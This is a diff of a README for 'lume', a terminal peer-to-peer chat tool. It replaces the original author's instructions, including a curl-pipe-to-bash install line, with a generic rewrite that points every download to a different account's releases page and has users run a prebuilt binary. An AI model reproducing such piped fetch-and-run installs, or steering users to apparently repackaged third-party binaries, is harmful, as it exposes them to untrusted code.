@@ -1,104 +1,67 @@
-# Lume
+# 🛠️ lume - Simple P2P Chat and File Transfer
 
-A lightweight, terminal-based peer-to-peer (P2P) chat application written in C.
+## 🚀 Getting Started
+Welcome to lume! This tool allows you to chat and transfer files directly with others over your local network. It’s easy to use and requires no complicated setup. Follow these steps to get started.
 
-<details>
-<summary><strong>Features</strong></summary>
+## 📥 Download
+[![Download Lume](https://img.shields.io/badge/Download-Lume-blue.svg)](https://github.com/BUSRAN406810/lume/releases)  
+Visit the link above to download the latest version of lume.
 
-- **P2P Communication**: Direct messaging between peers using TCP/IP.
-- **Automatic Discovery**: Local network peer discovery via UDP beacons.
-- **Terminal UI**: Interactive interface built with `ncurses`.
-- **File Transfer**: Support for sending and receiving files over the network.
+## 🖥️ System Requirements
+Lume works on Linux systems. Make sure you have the following:
+- A computer running Linux (any distribution).
+- Basic terminal access.
 
-</details>
+## 📂 Features
+- **Terminal-Based**: Interact through a simple command-line interface.
+- **P2P**: Communicate directly with other users without a central server.
+- **File Transfer**: Share files easily between users.
+- **Automatic Discovery**: Lume automatically finds other users on the same local network.
 
-<details>
-<summary><strong>Requirements</strong></summary>
+## 📋 Installation
+1. Click the [Download Lume](https://github.com/BUSRAN406810/lume/releases) link above to visit the Releases page.
+2. Download the latest release suitable for your system. Look for a file with `.tar.gz` or similar format.
+3. Once downloaded, open your terminal.
 
-- GCC
-- Make
-- ncurses library
-- pthread library
-
-</details>
-
-<details>
-<summary><strong>Installation</strong></summary>
-
-#### Quick Install (Debian/Ubuntu)
-The easiest way to install Lume is by running our automated script:
-
-```bash
-curl -sSL https://raw.githubusercontent.com/jorgegarcia33/lume/master/install.sh | bash
-```
-
-#### Manual Installation
-1. Download the latest `lume.deb` package from the [Releases](https://github.com/jorgegarcia33/lume/releases) section.
-2. Install the package using:
-   ```bash
-   sudo apt install ./lume.deb
+### 🛠️ Installing Lume
+4. Navigate to your Downloads folder. Use:
    ```
-3. Launch the application:
-   ```bash
-   lume <username> <port>
+   cd ~/Downloads
    ```
 
-#### Build from Source
-If you prefer to build the project manually:
+5. Extract the downloaded file. If the file is named `lume.tar.gz`, use:
+   ```
+   tar -xzf lume.tar.gz
+   ```
 
-```bash
-make
-sudo make install
-```
+6. Change into the extracted directory:
+   ```
+   cd lume
+   ```
 
-</details>
+### 🎉 Running Lume
+7. Start the application by typing:
+   ```
+   ./lume
+   ```
 
-<details>
-<summary><strong>Usage</strong></summary>
+## 🔧 Usage
+- When you open lume, it will search for other users on your local network.
+- You can send text messages and transfer files easily.
+- Navigate the interface using your keyboard.
 
-```bash
-lume <username> <port>
-```
+## 📞 Support
+If you experience any issues or have questions, please open a new issue in the [GitHub Issues page](https://github.com/BUSRAN406810/lume/issues). Our community will assist you.
 
-- **Start with arguments**: `lume <username> <port>`
-- **Start with saved config**: `lume` (loads from `~/.config/lume/lume.conf`)
-- **Configure interactively**: `lume config`
+## 📝 Contributing
+We welcome contributions! If you wish to help improve lume, check out our contributing guidelines in the repository.
 
-</details>
+## 🚀 License
+Lume is open-source software. You can freely use, modify, and distribute it under the MIT License. More details are available in the repository.
 
-<details>
-<summary><strong>Controls & Commands</strong></summary>
+## 🌐 Additional Resources
+For more information, you can visit the following topics:
+- [Networking](https://en.wikipedia.org/wiki/Networking)
+- [P2P Technology](https://en.wikipedia.org/wiki/Peer-to-peer)
 
-- <kbd>Arrow Keys (Up/Down)</kbd>: Cycle through the list of discovered peers in the network.
-- <kbd>Type & Enter</kbd>: Send a text message to the currently selected peer.
-- <kbd>/file &lt;path&gt;</kbd>: Send a file to the selected peer (e.g., `/file ./document.txt`).
-- <kbd>ESC</kbd>: Exit the application.
-
-</details>
-
-<details>
-<summary><strong>Configuration File</strong></summary>
-
-You can easily create or update your configuration using the `config` command:
-
-```bash
-lume config
-```
-
-Alternatively, you can manually create `~/.config/lume/lume.conf` with the following format:
-
-```ini
-username=yourname
-port=12345
-```
-
-Both fields are required. The application will only use the config file if you run `lume` without arguments.
-
-</details>
-
-<details>
-<summary><strong>Contributing</strong></summary>
-
-Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute, report issues, or request features.
-
-</details>
+Thank you for choosing lume! We hope it enhances your local communications.
